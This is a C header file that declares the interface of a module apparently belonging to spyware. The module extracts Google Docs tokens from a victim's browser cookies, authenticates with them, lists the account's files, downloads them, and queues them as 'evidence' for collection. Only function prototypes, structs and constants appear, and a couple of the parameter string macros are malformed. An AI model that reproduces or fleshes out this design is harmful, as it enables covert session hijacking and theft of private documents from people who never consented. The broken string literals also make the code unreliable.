#ifndef _GOOGLEDOCS_H_

#define _GOOGLEDOCS_H_

#include "JSON.h"

#define GD_TOKEN_PARAM	"\"token\":\""
#define GD_EUI_PARAM    "\"eui\":\""
#define GD_SSTU_PARAM   "\sstu\":"
#define GD_SI_PARAM     "\si\":\""
#define GD_DOCSREFTDK	"\"docs-reftdk\":\""
#define GD_DOCSHDCK	    "\"docs-hdck\":\""							
#define GD_DEVKEY_PARAM ""

#define GD_MAX_ITEMS	30

//max size (in bytes) of the file to download
#define GD_MAX_FILE_SIZE  25*(1024*1024) //25 MB
#define GD_FILE_ID		0
#define GD_FILE_NAME	2
#define GD_FILE_TYPE	3
#define GD_FILE_TIME	9
#define GD_FILE_TIME2	12
#define GD_FILE_SIZE	13

//extern SOCIAL_LOGS g_lpGDLogs[MAX_GDRIVE_QUEUE];

typedef enum
{
	GD_E_SUCCESS,
	GD_E_BUFFER_FULL,
	GD_E_HTTP,
	GD_E_ALLOC,
	GD_E_NO_PARAMS,
	GD_E_INVALID_JSON_DATA,
	GD_E_FILESIZE,
	GD_E_MISSING_COOKIE,
	GD_E_SKIP_FILE,
	GD_E_GENERIC,
	GD_E_UNKNOWN
} GD_ERRORS;

typedef enum
{
	GD_ITEM_UNKNOWN,
	GD_ITEM_DIR,
	GD_ITEM_DOC,
	GD_ITEM_XLS,
	GD_ITEM_PPT,
	GD_ITEM_JPG,	
	GD_ITEM_FILE,
} GD_ITEM_TYPE;


typedef struct
{
	LPSTR pszAuthHash;
	LPSTR pszAuthOrig;
	LPSTR pszDriveID;
	LPSTR pszToken;	
	LPSTR pszDevKey;
	DWORD dwTimestampDoc;
	DWORD dwTimestampFile;
} GD_PARAMS, *PGD_PARAMS;


typedef struct GD_FILE
{
	LPBYTE			pcFileBuf;
	LPWSTR			pwszFileID;
	LPWSTR			pwszFileName;
	DWORD			dwTimestamp;
	DWORD			dwFileSize;
	GD_ITEM_TYPE	FileType;
	GD_FILE			*Next;
} *PGD_FILE;

typedef struct
{
	DWORD		Items;
	PGD_FILE	List;
} GD_FILE_LIST, *PGD_FILE_LIST;


BOOL	GD_CreateTimestamp(LPSTR *pszOut, LPSTR pszIn);
void	GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);
void	GD_DumpBuffer(LPCWSTR lpFileName, WCHAR* lpBuffer, DWORD dwSize);
LPSTR	GD_EncodeURL(LPSTR strString);
//void	GD_FreeParams(PGD_PARAMS pParams);
DWORD	GD_GetParams(LPSTR pszCookie, PGD_PARAMS pParams);
DWORD	GD_GetToken(LPSTR strCookie, PGD_PARAMS pParams);
BOOL	GD_ParseForToken(LPSTR pszBuffer, LPWSTR *pszToken, LPWSTR *pwszUserName);
BOOL	GD_SearchParam(LPSTR *pszId, LPSTR pszBuffer, LPSTR pszIdTag, char cEndOfId, int nMaxLen);
BOOL	GD_SearchParam(LPWSTR *pwszId, LPSTR pszBuffer, LPSTR pszIdTag, char cEndOfId, int nMaxLen);

DWORD	GoogleDocsHandler(LPSTR strCookie);

BOOL	GD_AddFileExtension(LPWSTR *pwszFileName, GD_ITEM_TYPE FileType);
DWORD	GD_Authentication(PGD_PARAMS pParams, LPSTR pszCookie);
DWORD   GD_GetAuthParams(PGD_PARAMS pParams, LPSTR pszCookie);
DWORD	GD_CountListItems(PGD_FILE pFileList);
PGD_FILE GD_ScrollList(PGD_FILE pFileList, DWORD dwPos);
DWORD	GD_GetFileSize(JSONArray jFile, GD_ITEM_TYPE FileType);
void	GD_DeleteConnParams(PGD_PARAMS pParams);
void	GD_DeleteFile(PGD_FILE pFile);
//DWORD	GD_DownloadFiles(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPWSTR *pwszFileType, LPSTR pszCookie);
DWORD   GD_DownloadFiles(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCookie);
LPSTR	GD_ExtractCookie(LPSTR pszCookieName, LPSTR pszCookie);
DWORD	GD_GetFile(PGD_FILE pFile,  PGD_PARAMS pParams, LPSTR pszCookie);
DWORD	GD_GetFileCount(JSONArray jArray);
DWORD	GD_GetFileInfo(PGD_FILE_LIST pFileList, JSONArray jArray, DWORD dwSavedTimestamp);
DWORD	GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimestampDoc, DWORD dwSavedTimestampFile);
DWORD	GD_GetFileList(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCookie);
//DWORD   GD_GetFileList_V2(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCookie);
DWORD	GD_GetFileList_V2(PGD_FILE_LIST pDocList, PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPWSTR *pwszFileType, LPSTR pszCookie);
DWORD	GD_GetFileTimestamp(JSONObject jFileObj);
GD_ITEM_TYPE GD_GetFileType(JSONArray jFile);
GD_ITEM_TYPE GD_GetFileType(JSONObject jObj);
DWORD	GD_GetLastTimeStamp(LPSTR lpszPrefix, DWORD *dwTimestamp, LPSTR pstrSuffix);
DWORD	GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams);
BOOL	GD_IsGoogleDoc(GD_ITEM_TYPE FileType);
BOOL	GD_LogEvidence(PGD_FILE pFile);
int		GD_QueueLog(LPBYTE lpcEvBuf, DWORD dwEvSize);
DWORD	GD_SetLastTimeStamp(LPSTR lpszPrefix, DWORD dwTimestamp, LPSTR pstrSuffix);

//linked list functions
DWORD	GD_AddFileToList(PGD_FILE *pList, PGD_FILE pNewFile);
void	GD_DeleteFileList(PGD_FILE *pFileList);

#ifdef _DEBUG
void	GD_PrintList(PGD_FILE pFileList);
void	GD_ReportError(LPWSTR pwszError);
#endif

#endif